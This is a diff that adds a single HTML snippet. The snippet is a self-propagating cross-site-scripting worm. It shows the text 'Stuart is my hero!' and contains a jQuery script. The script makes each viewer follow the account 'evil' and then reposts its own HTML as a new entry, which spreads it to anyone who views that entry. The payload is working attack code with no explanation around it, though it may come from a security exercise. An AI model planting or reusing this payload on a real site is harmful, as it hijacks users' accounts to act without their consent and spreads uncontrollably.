@@ -1,0 +1,16 @@
+
+<div id="worm">
+Stuart is my hero!
+
+	<script >
+		jQuery.get('/api/users/evil/follow');
+		jQuery.ajax({
+			type: "POST",
+		  	url:'/api/entry',
+		  	data: JSON.stringify({ 'Entry': $('#worm').html() }),
+		  	dataType: "json"
+		});
+	</script>
+</div>
+
+
